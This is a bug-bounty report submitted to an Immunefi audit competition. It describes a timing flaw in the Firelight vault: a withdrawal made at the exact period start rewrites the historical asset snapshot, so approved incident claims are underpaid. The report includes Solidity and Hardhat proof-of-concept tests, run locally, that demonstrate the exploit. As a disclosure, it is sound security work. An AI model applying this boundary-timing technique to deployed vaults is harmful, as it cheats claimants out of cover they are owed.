# 89803 sc high a withdrawal at the exact period start rewrites the historical asset snapshot so approved incident claims are underpaid or paid nothing while the vault still holds the money

## #89803 \[SC-High] A withdrawal at the exact period start rewrites the historical asset snapshot, so approved incident claims are underpaid or paid nothing while the vault still holds the money

**Submitted on Aug 21st 2026 at 09:51:16 UTC by @jecikpo for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #89803
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Protocol insolvency
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

### Description

## A withdrawal at the exact period start rewrites the historical asset snapshot, so approved incident claims are underpaid or paid nothing while the vault still holds the money

### Brief/Intro

`FirelightVault.payout` decides how much of an approved claim it will pay by looking up how many assets the vault held at the start of the period the incident happened in. That stored number is not fixed. A `withdraw` or `redeem` in a block whose timestamp is exactly the period start overwrites the value for that timestamp, and every later reader sees the lowered figure. On mainnet this means an approved, validated claim is paid only a fraction of what it is owed, or nothing at all, while the vault is still physically holding the full amount. The incident is then marked closed, and the user who withdrew collects the assets that should have paid the claim. Anyone holding vault shares can do this in one permissionless transaction, and it can also happen by accident.

### Vulnerability Details

#### The problem

Firelight pays claims out of what the vault held at the start of the period the incident happened in. That figure is meant to be a settled historical fact. It is not. It is a checkpoint that can still be rewritten after the period has begun, by anyone, in one permissionless transaction.

A `withdraw(...)` or `redeem(...)` landing in **the block whose timestamp is exactly the period start does not append a new entry to the vault's history**. It overwrites the entry already sitting at that timestamp, lowering it. `payout(...)` then reads the lowered figure and caps the claim by it, while the vault is still holding the full amount.

#### Why the past is rewritable

`payout(...)` bounds the payment by `totalAssetsAt(capturePeriodStart)` (`FirelightVault.sol:911-927`), which is a checkpoint lookup, not a stored snapshot:

```solidity
uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);
...
paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount));
```

Two properties of the checkpoint library combine. `Checkpoints.push(...)` overwrites instead of appending when the **incoming key equals the latest key** (`Checkpoints.sol:207-209`), and `upperLookupRecent(...)` matches keys less than **or equal to** the query (`Checkpoints.sol:221-224`). A write stamped `T` therefore becomes the answer to a query for `T`.

`withdraw(...)` and `redeem(...)` perform exactly that write: both call `_logTrace(...)`, which stamps the new total with the current block timestamp (`FirelightVault.sol:1051-1055`). The value is lower because `totalAssets()` is net of `pendingWithdrawAssets` (`FirelightVault.sol:428`), so merely queuing a withdrawal reduces it. No token has left the contract.

#### The contradiction

At the period start `T`, the vault puts the same withdrawal on two different sides of the boundary within one transaction. For payability it is inside the period: `_requestWithdraw(...)` files the assets under `currentPeriod() + 1` (`FirelightVault.sol:1008`), which at `T` is `capturePeriod + 1`, and `payout(...)` counts that bucket as still exposed and still payable (`FirelightVault.sol:916`). For the cap it is before the period: the checkpoint written at key `T` is now the vault's answer for what it held when the period opened. `Math.min(...)` resolves the disagreement in favor of the cap, and the claimant absorbs the difference.

One second in either direction and the two agree. At `T - 1` the write lands on the previous key. At `T + 1` the key exceeds the query and the snapshot is untouched. `T` is the only timestamp where the write key collides with the query key while the period assignment has already advanced.

#### Trigger conditions

A single `withdraw(...)` or `redeem(...)` in a block whose timestamp equals a period start. No privileged role, no capital beyond the shares being withdrawn (returned in full one period later), and no coordination with the incident, which need not exist yet. On a chain with roughly two-second blocks a block bearing any given second usually exists, and the attempt costs only gas and repeats at every period boundary.

A zero result is also accepted: `payout(...)` does not revert, emits `PayoutExecuted` with `paidAmount = 0` (`FirelightVault.sol:929-930`), and `IncidentManager.approveCurrentAssessment(...)` records the amount only if nonzero while closing the incident either way (`IncidentManager.sol:432-434`). Nothing marks the claim as unpaid and there is no retry path.

### Impact Details

**Selected impact: Protocol insolvency (High).**

Firelight sells cover on the promise that it is backed by the vault's assets for that period. This bug breaks the promise from both ends. Capacity is sold against a figure that can be revised downward afterwards, and an approved claim against that same period is then capped by the revised figure. The protocol ends up unable to honor a claim it has already validated and approved, out of assets it is still holding.

Measured losses, from the PoC. A vault holding 1,000 fXRP, an incident captured at the period start asking for the full 1,000:

| Scenario                                                  | Claim paid | Claimant shortfall | Vault balance at payout |
| --------------------------------------------------------- | ---------: | -----------------: | ----------------------: |
| 900 withdrawn one second **after** the boundary (control) |      1,000 |                  0 |                   1,000 |
| 900 withdrawn **at** the boundary                         |        100 |                900 |                   1,000 |
| Entire position withdrawn at the boundary                 |      **0** |              1,000 |                   1,000 |

The first two rows leave the vault in an identical live state: the same 900 queued in the same withdrawal bucket, the same 100 active. The only difference is one second on the withdrawal's block timestamp, and it is worth 900 fXRP to the claimant.

In the last row `payout` completes without reverting, emits `paidAmount = 0`, the payout receiver gets nothing, the incident is closed, and the user who withdrew claims the entire 1,000 once the next period ends. Nothing was ever insolvent in the ordinary sense. Every asset was present and the vault declined to use it.

The shortfall is bounded by the size of the boundary withdrawal, up to 100% of the vault-funded part of any claim. The first-loss buffer pays before the vault and is unaffected, so the loss lands on the portion the vault was supposed to cover.

Two further consequences:

* **Cover keeps being sold against assets the claims path has written off.** Capacity committed at the period start stays frozen in `commit.totalAvailableCapacity`, so orders continue to settle against collateral that `payout` will no longer count.
* **It happens without an attacker.** Any ordinary user withdrawing in the boundary block corrupts the snapshot the same way, and the next claim in that period silently underpays. Neither the protocol nor the claimant would have any obvious signal that it happened.

### References

* [`FirelightVault.payout` reads the period-start snapshot and caps the payment by it](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L911-L927)
* [A zero payment is permitted and does not revert](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L929-L930)
* [`IncidentManager.approveCurrentAssessment` records the amount only if nonzero, then closes the incident regardless](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/IncidentManager.sol#L432-L434)
* [`payout` counts `withdrawAssets[capturePeriod + 1]` as still payable](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L916)
* [`_requestWithdraw` files the assets under `currentPeriod() + 1`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L1008)
* [`withdraw` logs the reduced total](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L775) and [`redeem` does the same](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L741)
* [`_logTrace` stamps it with the current timestamp](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L1051-L1055)
* [`totalAssets()` is net of `pendingWithdrawAssets`, so queuing a withdrawal lowers it](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L428)
* [`Checkpoints.push` overwrites when the key equals the latest key](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/lib/Checkpoints.sol#L207-L209)
* [`upperLookupRecent` returns the last checkpoint with a key less than or equal to the query](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/lib/Checkpoints.sol#L221-L224)
* [`CoverOrderAllocator._computeAvailableCapacity` reads it](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L711)
* [`commitAllocation` freezes the result in the period's commitment](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L352)

### Proof of Concept

Two new files. Nothing under `contracts/core/`, `contracts/oracle/` or `contracts/legacy/` is touched, and no existing test is modified.

| Path                                      | What it is                                                                                                                            |
| ----------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| `contracts/test/PeriodSnapshotReader.sol` | Test-only harness. Performs the allocator's period-start read in the same shape, without standing up the oracle and Merkle machinery. |
| `test/vault_boundary_snapshot.js`         | The five tests.                                                                                                                       |

### How to run

From a clean checkout of `v1_audit_ready` at commit `42f9ea5`:

```bash
npm install                                      # required; postinstall applies the OpenZeppelin patch
npx hardhat test test/vault_boundary_snapshot.js
```

Everything runs on the project's existing Hardhat network and its existing fixture, `deployVault()` from `test/setup/fixtures.js`. No forking, no RPC URL, no `.env`.

### What each test shows

Setup is the same in all five: 1,000 fXRP deposited during period 0, and `T` is the exact second at which period 1 begins.

| # | Test                               | Result                                                                                                                                                                                                                                           |
| - | ---------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 1 | snapshot rewritten                 | The harness reads 1,000 at `T`. After a withdrawal of 900 in that same block, `totalAssetsAt(T)` returns 100, with all 1,000 still in the vault.                                                                                                 |
| 2 | payout underpaid                   | An incident captured at `T` requesting 1,000 is paid **100**. The receiver gets 100, the vault keeps 900.                                                                                                                                        |
| 3 | withdrawal alone                   | No harness, no second transaction. The lone `withdraw` at `T` reproduces the underpayment, and asserts the contradiction directly: bucketed as exposed at `withdrawAssets[capturePeriod+1] = 900`, capped as absent at `totalAssetsAt(T) = 100`. |
| 4 | **control**, withdrawal at `T + 1` | Identical live state, 100 active and 900 queued in the same bucket. The snapshot is untouched at 1,000 and the payout pays **1,000** in full.                                                                                                    |
| 5 | drained at `T`                     | `totalAssetsAt(T)` becomes 0. `payout` emits `paidAmount = 0` without reverting, the receiver gets nothing, and the withdrawer claims all 1,000 a period later.                                                                                  |

Test 4 is the one that isolates the bug. Compared with test 2 the live state is identical, the withdrawal is the same size, and it falls in the same period and the same withdrawal bucket. The only difference is one second on the withdrawal's block timestamp, and it is worth 900 fXRP to the claimant.

### A note on the same-block setup

Tests 1, 2 and 5 need an on-chain read and a vault write to share one block at timestamp `T`. Hardhat mines one transaction per block by default, so the helper turns automine off, queues both transactions from the same signer (nonce ordering pins the sequence), then mines. It uses raw `eth_sendTransaction` rather than the ethers contract helpers, which block waiting for a receipt that cannot arrive until the block is mined. Each test asserts that the receipts share a block number, so the setup cannot silently degrade into two blocks and still pass.

Test 3 needs none of that. It is a single ordinary transaction and demonstrates the same loss.

### Expected output

```
  FirelightVault period-start snapshot is mutable at the boundary
    ✔ a withdrawal at the exact period start rewrites a snapshot already read in that block
    ✔ payout underpays by the boundary withdrawal while the assets are still in the vault
    ✔ needs no allocator, no second party and no ordering: the lone withdrawal is enough
    ✔ control: the same withdrawal one second later leaves the snapshot intact and payout pays in full
    ✔ draining at the boundary collapses the cap to zero and payout closes having paid nothing

  5 passing
```

The full suite stays green with these files added: `npm test` reports 457 passing, up from 452.

***

### File 1 — `contracts/test/PeriodSnapshotReader.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import {IFirelightVault} from "../core/interfaces/IFirelightVault.sol";

/**
 * @title PeriodSnapshotReader
 * @notice Test-only harness that models the one thing CoverOrderAllocator does with the vault
 *         when it commits an allocation.
 *
 * `CoverOrderAllocator._computeAvailableCapacity` reads
 * `vault.totalAssetsAt(vault.currentPeriodStart())` (CoverOrderAllocator.sol:711) and
 * `commitAllocation` then STORES the resulting capacity
 * (`commit.totalAvailableCapacity = matchingCapacity`, CoverOrderAllocator.sol:352)
 * rather than re-deriving it at settlement time.
 *
 * This harness performs the same read in the same shape so a PoC can show the read and a
 * same-timestamp vault write landing in one block, without standing up the full allocator,
 * its oracle, and its Merkle machinery.
 */
contract PeriodSnapshotReader {
    /// @notice Vault this harness snapshots.
    IFirelightVault public immutable vault;

    /// @notice Period start the last `commit()` read at.
    uint48 public snapshotTimestamp;
    /// @notice Value `totalAssetsAt(snapshotTimestamp)` returned during that call.
    uint256 public storedPeriodStartAssets;

    constructor(IFirelightVault _vault) {
        vault = _vault;
    }

    /// @notice Reads and stores the vault's assets at the current period start.
    function commit() external {
        uint48 periodStart = vault.currentPeriodStart();
        snapshotTimestamp = periodStart;
        storedPeriodStartAssets = vault.totalAssetsAt(periodStart);
    }
}
```

***

### File 2 — `test/vault_boundary_snapshot.js`

```javascript
const { loadFixture, time, mine } = require('@nomicfoundation/hardhat-network-helpers')
const { ethers, network } = require('hardhat')
const { expect } = require('chai')
const { deployVault } = require('./setup/fixtures.js')

// PoC for the mutable period-start snapshot (audit/leads.md L16).
//
// `payout` caps the amount it will pay by `totalAssetsAt(capturePeriodStart)`
// (FirelightVault.sol:911,927) and `CoverOrderAllocator._computeAvailableCapacity` sizes cover
// capacity from the same read (CoverOrderAllocator.sol:711). Both treat that value as a settled
// historical fact about the start of the period.
//
// It is not settled. `Checkpoints.push` overwrites on an equal key (lib/Checkpoints.sol:207-209)
// and `upperLookupRecent` is inclusive of the queried key (:221-224), while `withdraw`/`redeem`
// push `_totalAssets - assets` at `Time.timestamp()` (FirelightVault.sol:775, :741). So a
// withdrawal executed in a block whose timestamp is exactly the period start rewrites the value
// every later reader sees for that timestamp, including a payout that has not happened yet.

const DECIMALS = 6
const DEPOSIT = ethers.parseUnits('1000', DECIMALS)
const WITHDRAW = ethers.parseUnits('900', DECIMALS)

// Seed the vault and hand back the exact timestamp at which the next period begins.
async function boundaryFixture() {
  const ctx = await loadFixture(deployVault)

  const user = ctx.users[0]
  await ctx.utils.mintAndApprove(DEPOSIT, user)
  await ctx.firelight_vault.connect(user).deposit(DEPOSIT, user.address)

  const Reader = await ethers.getContractFactory('PeriodSnapshotReader')
  const reader = await Reader.deploy(ctx.firelight_vault.target)

  // End of period 0 is, to the second, the start of period 1.
  const boundary = await ctx.firelight_vault.currentPeriodEnd()

  return { ...ctx, user, reader, boundary }
}

// Land several calls in a single block with a chosen timestamp, in the order given.
// Automine is turned off so the transactions queue; they all come from `signer`, so nonce
// ordering pins the sequence. Raw `eth_sendTransaction` is used rather than the ethers
// contract helpers, which block waiting for a receipt that cannot arrive until the block mines.
const hex = (n) => '0x' + BigInt(n).toString(16)

async function sendInOneBlock(signer, timestamp, calls) {
  const hashes = []
  await network.provider.send('evm_setAutomine', [false])
  try {
    await time.setNextBlockTimestamp(timestamp)
    let nonce = await signer.getNonce()
    for (const { contract, fn, args } of calls) {
      const populated = await contract[fn].populateTransaction(...args)
      hashes.push(
        await network.provider.send('eth_sendTransaction', [
          {
            from: signer.address,
            to: populated.to,
            data: populated.data,
            gas: hex(3_000_000),
            nonce: hex(nonce++)
          }
        ])
      )
    }
    await mine()
  } finally {
    await network.provider.send('evm_setAutomine', [true])
  }

  const receipts = []
  for (const h of hashes) {
    const receipt = await ethers.provider.getTransactionReceipt(h)
    expect(receipt.status, 'queued transaction reverted').to.equal(1)
    receipts.push(receipt)
  }
  // Everything really did share one block, which is the whole point of the setup.
  for (const receipt of receipts) expect(receipt.blockNumber).to.equal(receipts[0].blockNumber)
  return receipts
}

describe('FirelightVault period-start snapshot is mutable at the boundary', function () {
  it('a withdrawal at the exact period start rewrites a snapshot already read in that block', async () => {
    const { firelight_vault, token_contract, user, reader, boundary } = await loadFixture(boundaryFixture)

    // The value the snapshot is supposed to freeze.
    expect(await firelight_vault.totalAssetsAt(boundary)).to.equal(DEPOSIT)

    await sendInOneBlock(user, boundary, [
      { contract: reader, fn: 'commit', args: [] },
      { contract: firelight_vault, fn: 'withdraw', args: [WITHDRAW, user.address, user.address] }
    ])

    // The on-chain read happened first and saw the full amount, exactly as an allocator
    // commit would have, and it stored that number.
    expect(await reader.snapshotTimestamp()).to.equal(boundary)
    expect(await reader.storedPeriodStartAssets()).to.equal(DEPOSIT)

    // The same timestamp now reports something else to everyone who reads it later.
    expect(await firelight_vault.totalAssetsAt(boundary)).to.equal(DEPOSIT - WITHDRAW)

    // Nothing left the vault. The assets are queued, not gone.
    expect(await token_contract.balanceOf(firelight_vault.target)).to.equal(DEPOSIT)
  })

  it('payout underpays by the boundary withdrawal while the assets are still in the vault', async () => {
    const { firelight_vault, token_contract, payout_signer, payout_receiver, user, reader, boundary } =
      await loadFixture(boundaryFixture)

    await sendInOneBlock(user, boundary, [
      { contract: reader, fn: 'commit', args: [] },
      { contract: firelight_vault, fn: 'withdraw', args: [WITHDRAW, user.address, user.address] }
    ])

    const capturePeriod = await firelight_vault.currentPeriod()
    expect(await firelight_vault.periodAtTimestamp(boundary)).to.equal(capturePeriod)

    // Everything the payout could legitimately draw on is still here:
    //   100 active + 900 queued for withdrawal = the full 1000 originally deposited.
    expect(await token_contract.balanceOf(firelight_vault.target)).to.equal(DEPOSIT)
    expect(await firelight_vault.totalAssets()).to.equal(DEPOSIT - WITHDRAW)
    expect(await firelight_vault.withdrawAssets(capturePeriod + 1n)).to.equal(WITHDRAW)

    // An incident captured at the period start asks for the whole vault.
    await expect(firelight_vault.connect(payout_signer).payout(payout_receiver.address, DEPOSIT, boundary))
      .to.emit(firelight_vault, 'PayoutExecuted')
      .withArgs(payout_receiver.address, DEPOSIT, DEPOSIT - WITHDRAW, boundary)

    // The claimant gets 100 of the 1000 that was exposed. The shortfall is the withdrawal.
    expect(await token_contract.balanceOf(payout_receiver.address)).to.equal(DEPOSIT - WITHDRAW)
    expect(await token_contract.balanceOf(firelight_vault.target)).to.equal(WITHDRAW)
  })

  it('needs no allocator, no second party and no ordering: the lone withdrawal is enough', async () => {
    const { firelight_vault, token_contract, payout_signer, payout_receiver, user, boundary } =
      await loadFixture(boundaryFixture)

    // One permissionless transaction, no harness involved, nothing else in the block.
    await time.setNextBlockTimestamp(boundary)
    await firelight_vault.connect(user).withdraw(WITHDRAW, user.address, user.address)

    const capturePeriod = await firelight_vault.currentPeriod()

    // The contradiction in one place. The same transaction is treated as INSIDE the capture
    // period for bucketing, so its assets stay exposed and payable...
    expect(await firelight_vault.withdrawAssets(capturePeriod + 1n)).to.equal(WITHDRAW)
    // ...and as BEFORE the capture period for the snapshot, so the cap says they were never there.
    expect(await firelight_vault.totalAssetsAt(boundary)).to.equal(DEPOSIT - WITHDRAW)

    // The cap wins, and it is the only thing standing between the claimant and the full amount.
    await expect(firelight_vault.connect(payout_signer).payout(payout_receiver.address, DEPOSIT, boundary))
      .to.emit(firelight_vault, 'PayoutExecuted')
      .withArgs(payout_receiver.address, DEPOSIT, DEPOSIT - WITHDRAW, boundary)

    expect(await token_contract.balanceOf(payout_receiver.address)).to.equal(DEPOSIT - WITHDRAW)
  })

  it('control: the same withdrawal one second later leaves the snapshot intact and payout pays in full', async () => {
    const { firelight_vault, token_contract, payout_signer, payout_receiver, user, reader, boundary } =
      await loadFixture(boundaryFixture)

    await sendInOneBlock(user, boundary, [{ contract: reader, fn: 'commit', args: [] }])

    // Identical withdrawal, identical period, one second past the boundary.
    await time.setNextBlockTimestamp(boundary + 1n)
    await firelight_vault.connect(user).withdraw(WITHDRAW, user.address, user.address)

    const capturePeriod = await firelight_vault.currentPeriod()
    expect(await firelight_vault.periodAtTimestamp(boundary)).to.equal(capturePeriod)

    // Same live state as the previous test: same active assets, same queued bucket.
    expect(await firelight_vault.totalAssets()).to.equal(DEPOSIT - WITHDRAW)
    expect(await firelight_vault.withdrawAssets(capturePeriod + 1n)).to.equal(WITHDRAW)

    // The only difference is the historical snapshot, which was not rewritten.
    expect(await firelight_vault.totalAssetsAt(boundary)).to.equal(DEPOSIT)

    await expect(firelight_vault.connect(payout_signer).payout(payout_receiver.address, DEPOSIT, boundary))
      .to.emit(firelight_vault, 'PayoutExecuted')
      .withArgs(payout_receiver.address, DEPOSIT, DEPOSIT, boundary)

    expect(await token_contract.balanceOf(payout_receiver.address)).to.equal(DEPOSIT)
    expect(await token_contract.balanceOf(firelight_vault.target)).to.equal(0n)
  })

  it('draining at the boundary collapses the cap to zero and payout closes having paid nothing', async () => {
    const { firelight_vault, token_contract, payout_signer, payout_receiver, user, reader, boundary, config } =
      await loadFixture(boundaryFixture)

    const allShares = await firelight_vault.balanceOf(user.address)

    await sendInOneBlock(user, boundary, [
      { contract: reader, fn: 'commit', args: [] },
      { contract: firelight_vault, fn: 'redeem', args: [allShares, user.address, user.address] }
    ])

    expect(await reader.storedPeriodStartAssets()).to.equal(DEPOSIT)
    expect(await firelight_vault.totalAssetsAt(boundary)).to.equal(0n)

    const capturePeriod = await firelight_vault.currentPeriod()

    // Every asset is still sitting in the vault, queued for the withdrawer.
    expect(await token_contract.balanceOf(firelight_vault.target)).to.equal(DEPOSIT)
    expect(await firelight_vault.withdrawAssets(capturePeriod + 1n)).to.equal(DEPOSIT)

    // payout does not revert. It pays zero and reports zero.
    await expect(firelight_vault.connect(payout_signer).payout(payout_receiver.address, DEPOSIT, boundary))
      .to.emit(firelight_vault, 'PayoutExecuted')
      .withArgs(payout_receiver.address, DEPOSIT, 0n, boundary)

    expect(await token_contract.balanceOf(payout_receiver.address)).to.equal(0n)

    // And the withdrawer collects the full amount once the bucket's period has passed.
    await time.increase(config.period_configuration_duration * 2)
    await firelight_vault.connect(user).claimWithdraw(capturePeriod + 1n)
    expect(await token_contract.balanceOf(user.address)).to.equal(DEPOSIT)
    expect(await token_contract.balanceOf(firelight_vault.target)).to.equal(0n)
  })
})
```
